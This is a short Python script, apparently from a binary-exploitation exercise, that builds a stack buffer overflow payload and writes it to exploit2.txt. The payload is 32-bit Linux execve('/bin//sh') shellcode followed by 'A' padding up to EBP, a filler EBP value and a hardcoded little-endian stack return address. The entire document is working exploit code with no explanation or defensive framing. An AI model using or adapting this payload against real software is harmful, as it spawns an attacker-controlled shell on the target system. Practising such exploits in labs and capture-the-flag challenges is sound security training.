shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80'
# Fill buffer fully and overflow upto EBP
payload = shellcode + b'\x41'*(0x44-len(shellcode))
# overwrite EBP
payload += b'\x90\x90\x90\x90'
# USING THE STACK ADDRESS FROM THE RUNNING PROCESS
# overwrite return address IN LITTLE ENDIAN
payload += b'\xB4\xCE\xFF\xFF'
with open('./exploit2.txt', 'wb') as f:
    f.write(payload)